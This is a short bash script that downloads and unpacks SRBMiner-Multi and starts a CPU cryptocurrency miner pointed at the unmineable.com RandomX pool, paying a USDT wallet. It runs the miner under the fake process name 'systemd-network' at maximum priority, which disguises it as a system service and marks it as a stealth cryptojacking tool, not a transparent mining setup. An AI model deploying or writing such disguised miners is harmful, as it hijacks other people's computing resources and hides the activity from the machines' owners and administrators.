tmux

#!/bin/bash

THREADS=3
MINER_NAME=$(shuf -i 10000000-99999999 -n 1)

mkdir -p neable
cd neable

# Kiểm tra đúng file SRBMiner có tồn tại không trước khi tải
if [ ! -f SRBMiner-Multi-2-8-1-Linux.tar.gz ]; then
  wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz
  tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz
fi

cd SRBMiner-Multi-2-8-1

exec -a systemd-network nice -n -20 ./SRBMiner-MULTI \
  --disable-gpu \
  --algorithm randomx \
  -o rx.unmineable.com:3333 \
  -a rx -k \
  -u USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$MINER_NAME#ii6d-2qcm \
  -p x \
  --cpu-threads $THREADS \
  --cpu-max-threads-hint=100 \
  --randomx-1gb-pages
